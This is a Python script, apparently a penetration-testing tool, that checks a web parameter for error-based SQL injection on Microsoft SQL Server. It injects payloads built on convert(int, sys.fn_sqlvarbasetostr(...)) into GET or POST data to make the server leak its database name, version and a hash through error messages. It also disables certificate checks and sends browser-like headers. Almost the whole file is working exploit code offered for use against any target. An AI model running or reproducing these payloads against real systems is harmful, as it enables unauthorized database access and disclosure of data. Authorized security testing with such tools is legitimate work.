#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

payload_list = ["convert(int,sys.fn_sqlvarbasetostr({}))","1/**/and/**/cconvert(int,sys.fn_sqlvarbasetostr({}))","'and/**/convert(int,sys.fn_sqlvarbasetostr({}))>'0"]

select_list = ["db_name()", "@@version","HashBytes('MD5','1')"]


def verify(vulnurl, postdata):
    headers = {
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/92.0.4515.131 Safari/537.36',
                'Upgrade-Insecure-Requests':'1',
                'Connection':'keep-alive',
                'Cache-Control':'max-age=0',
                'Accept-Encoding':'gzip, deflate, sdch',
                'Accept-Language':'zh-CN,zh;q=0.8',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': vulnurl
    }
    try:
        r = requests.post(vulnurl, data=postdata, headers=headers, verify=False, timeout=10)
        #print(r.text)
        if "nvarchar" in r.text:
            info = re.findall("nvarchar(.*)int", r.text)
            if len(info) != 0 and "fn_sqlvarbasetostr" not in info[0]:
                return info[0]
    except:
        #print(sys.exc_info())
        return "except"
    return "nosql"

def mage_payload(data, payload, parm):
    parm_list = []
    for p in data.split("&"):
        if p.split("=")[0] == parm:
            parm_list.append(parm+"="+payload)
        else:
            parm_list.append(p)
    return "&".join(parm_list)

def check(vulnurl, postdata, parm):
    info = verify(vulnurl, postdata)
    if info == "except":
        return False, "except"
    uri = vulnurl.split("?")[0]
    getdata = ""
    if "?" in vulnurl:
        getdata = "?".join(vulnurl.split("?")[1:])
    for select in select_list:
        for payload in payload_list:
            select_payload = payload.format(select)
            getdata_payload = mage_payload(getdata, select_payload, parm)
            postdata_payload = mage_payload(postdata, select_payload, parm)
            new_vulurl = uri
            if "?" in vulnurl:
                new_vulurl = uri + "?" + getdata_payload
            #print(new_vulurl, postdata_payload)
            info = verify(new_vulurl, postdata_payload)
            if info != "except" and info != "nosql":
                return info, select_payload
    return False, info

if __name__=="__main__":
    target = sys.argv[1]
    data = sys.argv[2]
    parm = sys.argv[3]
    for i in range(0,3):
        info, payload = check(target, data, parm)
        if info != False:
            print("[+]漏洞存在，SQL 检测 paylaod: ", payload,"查询结果为：", info)
            sys.exit()
        else:
            print("[-]漏洞不存在：", payload)
